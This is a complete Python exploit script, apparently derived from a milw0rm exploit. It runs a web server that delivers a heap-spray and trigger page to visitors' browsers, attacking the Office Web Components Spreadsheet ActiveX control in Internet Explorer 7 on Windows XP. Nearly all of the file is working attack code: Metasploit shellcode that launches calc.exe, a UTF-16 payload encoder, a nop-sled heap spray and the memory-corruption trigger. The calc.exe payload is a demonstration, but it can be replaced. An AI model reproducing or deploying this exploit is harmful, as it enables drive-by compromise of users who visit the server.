#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#   
#   - Based on the code posted at http://www.milw0rm.com/exploits/9163
#   - Tested using:
#     > Internet Explorer 7.0.5730.13 on Windows XP SP3 with owc10.dll installed
#     > Internet Explorer 7.0.5730.13 on Windows XP SP3 with owc11.dll installed
#
#   Usage  : python ie_owc.py [port (between 1024 and 65535)]
#   

import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        # From Beta v2.0 by Berend-Jan Wever
        # http://www.milw0rm.com/exploits/656
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73'
        payload += '\x13\x6f\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e'
        payload += '\x6f\x02\x3a\x4b\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a'
        payload += '\x3a\x51\x4f\x03\x5a\x47\xe4\x36\x3a\x0f\x81\x33\x71\x97'
        payload += '\xc3\x86\x71\x7a\x68\xc3\x7b\x03\x6e\xc0\x5a\xfa\x54\x56'
        payload += '\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68\xe4\x0e\xfa\x85'
        payload += '\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a\x6b\xc1'
        payload += '\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02'
        payload += '\x3a\x66\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e'
        payload += '\x07\x7c\x69\xec\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61'
        payload += '\xd0\x62\x0c\x2c\xd4\x76\x0a\x02\xb1\x0e'
        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''
       
        function spray_heap()
        {
            var chunk_size, payload, nopsled;
            
            chunk_size = 0x100000;
            payload = unescape("<PAYLOAD>");
            nopsled = unescape("<NOP>");
            while (nopsled.length < chunk_size)
                nopsled += nopsled;
            nopsled_len = chunk_size - (payload.length + 20);        
            nopsled = nopsled.substring(0, nopsled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < <CHUNKS> ; i++)
                heap_chunks[i] = nopsled + payload;
        }    
         
        function trigger_bug()
        {
            var obj, arr;
           
            try {
                obj = new ActiveXObject("OWC10.Spreadsheet");
            } catch (err) { 
                try {
                    obj = new ActiveXObject("OWC11.Spreadsheet");	
           		} catch (err) {
                    window.location = 'about:blank';	
           		}
            }
            arr = new Array();
            arr.push(1);
            arr.push(2);
            arr.push(0);
            arr.push(window);
            for (var i = 0 ; i < arr.length ; i++) {
                for (var j = 0 ; j < 10 ; j++) {
                    try {
                        obj.Evaluate(arr[i]);
                    } catch (err) {}
                }
            }        
            window.status = arr[3] + "";
            for (var j = 0 ; j < 10 ; j++) {
                try {
                    obj.msDataSource(arr[3]);
                } catch (err) {}
            }
        }

        spray_heap();
        trigger_bug();
				
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0b0c%u0b0c')
        exploit = exploit.replace('<CHUNKS>', '100')      
        exploit = '<html><body><script>' + exploit + '</script></body></html>'
        return exploit 

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            exit_program()
            
def exit_program():
    print '[-] Exiting ...'
    sys.exit(0)
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                exit_program()
        except socket.error:
            print '[*] Error : a socket error has occurred'
            exit_program()    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        exit_program()
            
if __name__ == '__main__':
    main()

